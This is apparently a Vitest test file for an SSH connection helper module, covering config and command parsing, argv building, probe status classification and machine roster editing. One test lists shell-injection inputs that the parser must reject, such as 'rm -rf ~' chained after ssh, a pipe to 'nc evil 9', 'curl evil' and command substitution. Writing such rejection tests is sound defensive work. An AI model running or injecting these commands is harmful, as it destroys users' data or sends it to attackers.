/**
 * The pure SSH model: config parsing, target parsing, argv building, probe
 * classification and roster ordering.
 *
 * Everything here is Node-free by design, so the assertions are about *rules*
 * rather than about a live `ssh`: a wrong connect line is invisible until it
 * fails on someone's machine, which is exactly why it is pinned here instead.
 */
import { describe, expect, it } from 'vitest'
import {
  classifyProbe,
  changesConnection,
  clampPort,
  dedupeMachines,
  editMachine,
  expandHome,
  filterHidden,
  isHiddenRemoval,
  baseName,
  joinFor,
  machineEditOf,
  machineKey,
  makeMachine,
  machineSlug,
  normalizeHidden,
  parseSshConfig,
  parseSshCommand,
  parseTarget,
  probeArgv,
  rankMachines,
  setupLines,
  shellQuote,
  sshArgv,
  sshLine
} from '../src/shared/ssh'

const HOME = '/Users/tester'

describe('clampPort', () => {
  it('keeps a real port and zeroes everything else', () => {
    expect(clampPort(2222)).toBe(2222)
    expect(clampPort('22')).toBe(22)
    expect(clampPort(0)).toBe(0)
    expect(clampPort(70000)).toBe(0)
    expect(clampPort(-1)).toBe(0)
    expect(clampPort('nope')).toBe(0)
    expect(clampPort(undefined)).toBe(0)
  })
})

describe('expandHome', () => {
  it('expands ~ and ~/ against the caller home, and leaves the rest', () => {
    expect(expandHome('~', HOME)).toBe(HOME)
    expect(expandHome('~/.ssh/id', HOME)).toBe('/Users/tester/.ssh/id')
    expect(expandHome('~user/x', HOME)).toBe('~user/x')
    expect(expandHome('/abs/path', HOME)).toBe('/abs/path')
    expect(expandHome('~/.ssh/id', '')).toBe('~/.ssh/id')
  })

  it('matches a Windows home separator', () => {
    expect(expandHome('~/.ssh/id', 'C:\\Users\\me')).toBe('C:\\Users\\me\\.ssh\\id')
  })
})

describe('shellQuote', () => {
  it('leaves safe tokens bare and single-quotes the rest', () => {
    expect(shellQuote('host')).toBe('host')
    expect(shellQuote('user@host')).toBe('user@host')
    expect(shellQuote('-p')).toBe('-p')
    expect(shellQuote('My Keys/id')).toBe(`'My Keys/id'`)
    expect(shellQuote("it's")).toBe(`'it'\\''s'`)
  })
})

describe('machineSlug', () => {
  it('folds and strips, dropping empty and zero parts', () => {
    expect(machineSlug('Host', 0, 'User')).toBe('host-user')
    expect(machineSlug('a b_c', 22)).toBe('a-b-c-22')
    expect(machineSlug()).toBe('machine')
  })
})

describe('makeMachine', () => {
  it('fills the label and a provisional id, clamping the port', () => {
    const m = makeMachine({ host: 'example.com', user: 'alice', port: '2222' })
    expect(m.label).toBe('alice@example.com')
    expect(m.port).toBe(2222)
    expect(m.source).toBe('saved')
    expect(m.id).toBe('saved:example-com-2222-alice')
  })

  it('falls back to the bare host for a label and keeps an explicit id', () => {
    const m = makeMachine({ host: 'box', id: 'keep-me' })
    expect(m.label).toBe('box')
    expect(m.id).toBe('keep-me')
  })

  it('preserves config and herdr sources but normalises anything else to saved', () => {
    expect(makeMachine({ host: 'h', source: 'config' }).source).toBe('config')
    expect(makeMachine({ host: 'h', source: 'herdr' }).source).toBe('herdr')
    expect(makeMachine({ host: 'h', source: 'bogus' as never }).source).toBe('saved')
  })
})

describe('parseSshConfig', () => {
  it('reads a literal Host block into one machine, alias winning', () => {
    const config = [
      'Host myserver',
      '  HostName 1.2.3.4',
      '  Port 2222',
      '  User alice',
      '  IdentityFile ~/.ssh/id_ed25519'
    ].join('\n')
    const [machine] = parseSshConfig(config)
    expect(machine.alias).toBe('myserver')
    expect(machine.host).toBe('1.2.3.4')
    expect(machine.port).toBe(2222)
    expect(machine.user).toBe('alice')
    expect(machine.identityFile).toBe('~/.ssh/id_ed25519')
    expect(machine.source).toBe('config')
  })

  it('falls back to the alias as host when HostName is absent', () => {
    const [machine] = parseSshConfig('Host box\n  User bob')
    expect(machine.host).toBe('box')
    expect(machine.alias).toBe('box')
    expect(machine.user).toBe('bob')
  })

  it('skips wildcard, negated and Match blocks', () => {
    const config = [
      'Host *',
      '  ServerAliveInterval 60',
      'Host !bad *',
      '  User nobody',
      'Match host example',
      '  User bob',
      'Host real',
      '  HostName 10.0.0.1'
    ].join('\n')
    const machines = parseSshConfig(config)
    expect(machines.map((m) => m.alias)).toEqual(['real'])
  })

  it('does not follow Include and ignores unknown keys', () => {
    const config = ['Include other.conf', 'Host h', '  HostName x', '  ForwardAgent yes'].join('\n')
    const machines = parseSshConfig(config)
    expect(machines).toHaveLength(1)
    expect(machines[0].host).toBe('x')
  })

  it('honours first-value-wins and strips comments', () => {
    const config = [
      '# a comment',
      'Host h',
      '  User first  # trailing',
      '  User second',
      '  Port=2200'
    ].join('\n')
    const [machine] = parseSshConfig(config)
    expect(machine.user).toBe('first')
    expect(machine.port).toBe(2200)
  })

  it('takes the first literal alias when a Host lists several', () => {
    const [machine] = parseSshConfig('Host a b c\n  HostName h')
    expect(machine.alias).toBe('a')
  })

  it('tolerates CRLF and returns nothing for an empty config', () => {
    expect(parseSshConfig('Host h\r\n  HostName x\r\n')).toHaveLength(1)
    expect(parseSshConfig('')).toEqual([])
  })
})

describe('parseTarget', () => {
  it('reads the common spellings', () => {
    expect(parseTarget('host')?.host).toBe('host')
    const a = parseTarget('alice@box')
    expect(a?.user).toBe('alice')
    expect(a?.host).toBe('box')
    const b = parseTarget('alice@box:2222')
    expect(b?.port).toBe(2222)
    const c = parseTarget('ssh://alice@box:2200')
    expect(c?.user).toBe('alice')
    expect(c?.port).toBe(2200)
  })

  it('handles a bracketed IPv6 host', () => {
    const m = parseTarget('[::1]:2222')
    expect(m?.host).toBe('::1')
    expect(m?.port).toBe(2222)
  })

  it('treats a non-numeric colon suffix as part of the host, not a port', () => {
    const m = parseTarget('host:path')
    expect(m?.host).toBe('host:path')
    expect(m?.port).toBe(0)
  })

  it('rejects blanks, and hands a spaced line to the command parser', () => {
    expect(parseTarget('')).toBeNull()
    // Two bare words name no machine: the command parser is the one that
    // decides, and it refuses to guess that the first word was a hostname.
    expect(parseTarget('two words')).toBeNull()
    expect(parseTarget('ssh alice@box:2222')?.host).toBe('box')
  })
})

describe('parseSshCommand', () => {
  it('reads the line a user pastes out of a README or their own history', () => {
    const m = parseSshCommand('ssh wanlian@172.18.29.206 -p 2222')
    expect(m?.host).toBe('172.18.29.206')
    expect(m?.user).toBe('wanlian')
    expect(m?.port).toBe(2222)
    // And the round trip is the same command, which is the point of rebuilding it.
    expect(sshLine(m!)).toBe('ssh -p 2222 wanlian@172.18.29.206')
  })

  it('reads the flags that say where to go, in either order', () => {
    const a = parseSshCommand('ssh -p 2200 -i ~/.ssh/work -J bastion alice@box')
    expect(a?.port).toBe(2200)
    expect(a?.identityFile).toBe('~/.ssh/work')
    expect(a?.proxyJump).toBe('bastion')
    expect(a?.user).toBe('alice')
    // Attached values and clusters are the same flags, spelled tightly.
    const b = parseSshCommand('ssh -vp2200 alice@box')
    expect(b?.port).toBe(2200)
    expect(b?.host).toBe('box')
  })

  it('reads -o the way ssh does, and lets the destination win nothing it already said', () => {
    const m = parseSshCommand('ssh -o Port=2200 -o IdentityFile=~/.ssh/k -l bob box:22')
    expect(m?.port).toBe(2200)
    expect(m?.identityFile).toBe('~/.ssh/k')
    expect(m?.user).toBe('bob')
    expect(m?.host).toBe('box')
  })

  it('drops the remote command instead of typing it into a fresh pane', () => {
    const m = parseSshCommand('ssh alice@box uptime -p 2200')
    expect(m?.host).toBe('box')
    expect(m?.port).toBe(2200)
    expect(sshLine(m!)).toBe('ssh -p 2200 alice@box')
  })

  it('refuses a line carrying a shell metacharacter anywhere', () => {
    for (const line of [
      'box ; rm -rf ~',
      'ssh box; rm -rf ~',
      'ssh box | nc evil 9',
      'ssh box && curl evil',
      'ssh "quoted host"',
      'ssh $(whoami)',
      'ssh box`id`'
    ]) {
      expect(parseSshCommand(line), line).toBeNull()
    }
  })

  it('refuses a destination that is not made of hostname characters', () => {
    expect(parseSshCommand('ssh /etc/passwd')).toBeNull()
    expect(parseSshCommand('ssh ~/somewhere')).toBeNull()
    expect(parseSshCommand('ssh')).toBeNull()
    expect(parseSshCommand('')).toBeNull()
  })

  it('needs an ssh or a flag before it will read two words as host plus command', () => {
    // `box uptime` with nothing marking it as a command is two words, and picking
    // the first would connect somewhere nobody named.
    expect(parseSshCommand('box uptime')).toBeNull()
    expect(parseSshCommand('ssh box uptime')?.host).toBe('box')
    expect(parseSshCommand('-p 2200 box')?.host).toBe('box')
  })
})

describe('sshArgv / sshLine', () => {
  it('lets a config alias win outright', () => {
    const m = makeMachine({ host: '1.2.3.4', alias: 'myserver', port: 2222, user: 'alice' })
    expect(sshArgv(m)).toEqual(['ssh', 'myserver'])
    expect(sshLine(m)).toBe('ssh myserver')
  })

  it('builds the full form for a saved target', () => {
    const m = makeMachine({
      host: '1.2.3.4',
      user: 'alice',
      port: 2222,
      identityFile: '~/.ssh/id',
      proxyJump: 'bastion'
    })
    expect(sshArgv(m, { home: HOME })).toEqual([
      'ssh',
      '-p',
      '2222',
      '-i',
      '/Users/tester/.ssh/id',
      '-J',
      'bastion',
      'alice@1.2.3.4'
    ])
  })

  it('omits the user token when none is known', () => {
    expect(sshArgv(makeMachine({ host: 'box' }))).toEqual(['ssh', 'box'])
  })

  it('quotes a path with a space in the line form', () => {
    const m = makeMachine({ host: 'box', identityFile: '~/My Keys/id' })
    expect(sshLine(m, { home: HOME })).toBe(`ssh -i '/Users/tester/My Keys/id' box`)
  })
})

describe('probeArgv', () => {
  it('is non-interactive and runs a trivial remote command', () => {
    const argv = probeArgv(makeMachine({ host: 'box', user: 'alice', port: 2222 }))
    expect(argv).toContain('BatchMode=yes')
    expect(argv).toContain('StrictHostKeyChecking=accept-new')
    expect(argv[argv.length - 1]).toBe('exit')
    expect(argv).toContain('alice@box')
  })

  it('uses the alias when present', () => {
    const argv = probeArgv(makeMachine({ host: 'h', alias: 'myserver' }))
    expect(argv).toContain('myserver')
    expect(argv.join(' ')).not.toContain('-p')
  })
})

describe('classifyProbe', () => {
  it('maps exit and stderr to a status', () => {
    expect(classifyProbe(0, '')).toBe('ok')
    expect(classifyProbe(255, 'Permission denied (publickey).')).toBe('auth')
    expect(classifyProbe(255, 'Host key verification failed.')).toBe('host-key')
    expect(classifyProbe(255, 'ssh: connect to host x port 22: Connection timed out')).toBe('timeout')
    expect(classifyProbe(255, 'Connection refused')).toBe('unreachable')
    expect(classifyProbe(255, 'Could not resolve hostname x')).toBe('unreachable')
    expect(classifyProbe(127, 'ssh: command not found')).toBe('no-ssh')
    expect(classifyProbe(1, 'something odd')).toBe('error')
  })

  it('lets an explicit timeout win', () => {
    expect(classifyProbe(255, 'Permission denied', true)).toBe('timeout')
  })

  it('tests host-key before auth, since both print Permission denied', () => {
    expect(classifyProbe(255, 'Host key verification failed.\nPermission denied')).toBe('host-key')
  })
})

describe('rankMachines', () => {
  const saved = makeMachine({ host: 'zed', id: 's1', label: 'zed', source: 'saved' })
  const config = makeMachine({ host: 'alpha', alias: 'alpha', source: 'config' })
  const herdr = makeMachine({ host: 'mid', source: 'herdr' })

  it('orders saved, config, herdr and filters by query', () => {
    expect(rankMachines([herdr, config, saved], '').map((m) => m.source)).toEqual([
      'saved',
      'config',
      'herdr'
    ])
    expect(rankMachines([herdr, config, saved], 'alph').map((m) => m.label)).toEqual(['alpha'])
  })
})

describe('dedupeMachines', () => {
  it('keeps the higher-precedence source for one identity', () => {
    const config = makeMachine({ host: 'h', alias: 'h', source: 'config' })
    const herdr = makeMachine({ host: 'h', alias: 'h', source: 'herdr' })
    const result = dedupeMachines([herdr, config])
    expect(result).toHaveLength(1)
    expect(result[0].source).toBe('config')
  })
})

describe('setupLines', () => {
  it('uses ssh-copy-id on posix', () => {
    const m = makeMachine({ host: 'box', user: 'alice', port: 2222 })
    expect(setupLines(m, { platform: 'posix', home: HOME })[0]).toBe(
      'ssh-copy-id -p 2222 alice@box'
    )
  })

  it('pipes the public key on windows and keeps the remote command posix', () => {
    const m = makeMachine({ host: 'box', user: 'alice' })
    const line = setupLines(m, { platform: 'windows' })[0]
    expect(line.startsWith('type ')).toBe(true)
    expect(line).toContain('ssh alice@box')
    expect(line).toContain('authorized_keys')
  })

  it('uses the alias directly when the machine came from config', () => {
    const m = makeMachine({ host: 'h', alias: 'myserver', source: 'config' })
    expect(setupLines(m, { platform: 'posix' })[0]).toBe('ssh-copy-id myserver')
  })
})

/**
 * Path arithmetic with the separator of the *named* platform.
 *
 * `node:path` picks its separator once, at load time, so anything built on it
 * answers a different question on a different runner. These two exist so a
 * service told `platform: 'posix'` with a faked home describes the same world on
 * every host - and so a Windows key path reduces to a filename on Linux, where
 * `path.basename` would return the whole thing and the ranking it feeds would
 * silently do nothing.
 */
describe('joinFor', () => {
  it('uses the separator of the platform it was told about', () => {
    expect(joinFor('posix', '/home/t', '.ssh', 'id_rsa.pub')).toBe('/home/t/.ssh/id_rsa.pub')
    expect(joinFor('windows', 'C:\\Users\\t', '.ssh', 'id_rsa.pub')).toBe(
      'C:\\Users\\t\\.ssh\\id_rsa.pub'
    )
  })

  it('drops empty parts and the slashes where two meet', () => {
    expect(joinFor('posix', '/home/t/', '/.ssh/', '', 'config')).toBe('/home/t/.ssh/config')
    expect(joinFor('posix')).toBe('')
    expect(joinFor('posix', '', '')).toBe('')
  })

  it('leaves a lone part alone, so a relative head is not rewritten', () => {
    expect(joinFor('posix', 'herdr')).toBe('herdr')
    expect(joinFor('windows', 'C:\\Users\\t')).toBe('C:\\Users\\t')
  })
})

describe('baseName', () => {
  it('splits on either separator, whichever host produced the path', () => {
    expect(baseName('/home/t/.ssh/id_ed25519.pub')).toBe('id_ed25519.pub')
    expect(baseName('C:\\Users\\t\\.ssh\\id_ed25519.pub')).toBe('id_ed25519.pub')
    expect(baseName('id_ed25519.pub')).toBe('id_ed25519.pub')
  })

  it('ignores a trailing separator, and answers empty for empty', () => {
    expect(baseName('/home/t/.ssh/')).toBe('.ssh')
    expect(baseName('')).toBe('')
  })
})

/* Editing and dismissing a row are the two verbs the palette grew, and both
   have a rule that is invisible until it bites: an edit that keeps a config
   alias silently discards every other field, and a hide that followed a saved
   row would delete a record we do not own. */

describe('editMachine', () => {
  const config = makeMachine({
    id: 'config:prod',
    host: '10.0.0.5',
    port: 2200,
    user: 'deploy',
    alias: 'prod',
    source: 'config'
  })

  it('keeps the durable id, so an edit upserts instead of duplicating', () => {
    const next = editMachine(config, { label: 'prod (via bastion)' })
    expect(next.id).toBe('config:prod')
    expect(next.label).toBe('prod (via bastion)')
  })

  it('always yields a machine we own, because the edit is ours', () => {
    // `~/.ssh/config` is a file we were asked to read; rewriting a block in it
    // from a desktop app is not a surprise worth springing.
    expect(editMachine(config, { port: 22 }).source).toBe('saved')
    expect(editMachine(makeMachine({ host: 'h', source: 'herdr' }), { label: 'x' }).source).toBe(
      'saved'
    )
  })

  it('keeps a config alias through a rename, where the block is still the truth', () => {
    expect(editMachine(config, { label: 'prod box' }).alias).toBe('prod')
    expect(editMachine(config, { host: '10.0.0.5', user: 'deploy', port: '2200' }).alias).toBe(
      'prod'
    )
  })

  it('drops the alias the moment anything ssh dials changes', () => {
    // `sshArgv` short-circuits on the alias, so keeping it while the human
    // retypes the port would dial `ssh prod` and throw the port away: a form
    // that accepts your input and then does not use it.
    for (const patch of [
      { port: 22 },
      { host: '10.0.0.9' },
      { user: 'root' },
      { identityFile: '~/.ssh/other' },
      { proxyJump: 'bastion' }
    ]) {
      expect(editMachine(config, patch).alias).toBe('')
    }
    expect(editMachine(config, { port: 22 }).port).toBe(22)
  })

  it('treats an absent field as untouched and an empty one as cleared', () => {
    const jumped = makeMachine({ host: 'h', proxyJump: 'bastion', identityFile: '~/.ssh/k' })
    expect(editMachine(jumped, {}).proxyJump).toBe('bastion')
    expect(editMachine(jumped, { label: 'x' }).identityFile).toBe('~/.ssh/k')
    expect(editMachine(jumped, { proxyJump: '' }).proxyJump).toBe('')
    // An empty port is not a missing one: it means "let ssh use 22".
    expect(editMachine(config, { port: '' }).port).toBe(0)
  })

  it('lets an explicit alias win, since that is the human overriding the rule', () => {
    expect(editMachine(config, { port: 2222, alias: ' prod2 ' }).alias).toBe('prod2')
  })
})

describe('changesConnection', () => {
  const machine = makeMachine({
    host: '10.0.0.5',
    port: 2200,
    user: 'deploy',
    alias: 'prod',
    source: 'config'
  })

  it('is false for a rename, and for retyping what is already there', () => {
    expect(changesConnection(machine, { label: 'whatever' })).toBe(false)
    expect(changesConnection(machine, {})).toBe(false)
    expect(changesConnection(machine, { host: ' 10.0.0.5 ', user: 'deploy ', port: '2200' })).toBe(
      false
    )
  })

  it('is true for anything ssh would dial differently', () => {
    expect(changesConnection(machine, { host: '10.0.0.6' })).toBe(true)
    expect(changesConnection(machine, { port: 22 })).toBe(true)
    expect(changesConnection(machine, { port: '' })).toBe(true)
    expect(changesConnection(machine, { user: 'root' })).toBe(true)
    expect(changesConnection(machine, { identityFile: '~/.ssh/id_rsa' })).toBe(true)
    expect(changesConnection(machine, { proxyJump: 'bastion' })).toBe(true)
  })
})

describe('machineEditOf', () => {
  it('pre-fills every field the form owns, so it opens filled rather than empty', () => {
    const machine = makeMachine({
      host: 'h',
      port: 2222,
      user: 'u',
      identityFile: '~/.ssh/k',
      proxyJump: 'j',
      alias: 'a',
      label: 'L'
    })
    expect(machineEditOf(machine)).toEqual({
      label: 'L',
      host: 'h',
      port: 2222,
      user: 'u',
      identityFile: '~/.ssh/k',
      proxyJump: 'j',
      alias: 'a'
    })
  })
})

describe('dismissing a row', () => {
  it('hides what we were only told about and deletes what we own', () => {
    expect(isHiddenRemoval(makeMachine({ host: 'h', source: 'config' }))).toBe(true)
    expect(isHiddenRemoval(makeMachine({ host: 'h', source: 'herdr' }))).toBe(true)
    expect(isHiddenRemoval(makeMachine({ host: 'h', source: 'saved' }))).toBe(false)
  })

  it('filters a roster by identity, case-insensitively', () => {
    const prod = makeMachine({ host: '10.0.0.5', alias: 'prod', source: 'config' })
    const other = makeMachine({ host: '10.0.0.6', source: 'config' })
    expect(filterHidden([prod, other], [machineKey(prod).toUpperCase()]).map((m) => m.host)).toEqual(
      ['10.0.0.6']
    )
    // No hidden list is the common case, and it must not copy or reorder.
    expect(filterHidden([prod, other], [])).toEqual([prod, other])
  })

  it('never hides a saved row, because a later pin is the later decision', () => {
    const saved = makeMachine({ host: '10.0.0.5', user: 'deploy', source: 'saved' })
    const key = machineKey(makeMachine({ host: '10.0.0.5', user: 'deploy', source: 'config' }))
    expect(key).toBe(machineKey(saved))
    expect(filterHidden([saved], [key])).toHaveLength(1)
  })

  it('normalises a stored list: lowercased, deduped, in order, no blanks', () => {
    expect(normalizeHidden([' A@B ', 'a@b', '', null, undefined, 42, 'c'])).toEqual([
      'a@b',
      '42',
      'c'
    ])
    expect(normalizeHidden([])).toEqual([])
  })
})
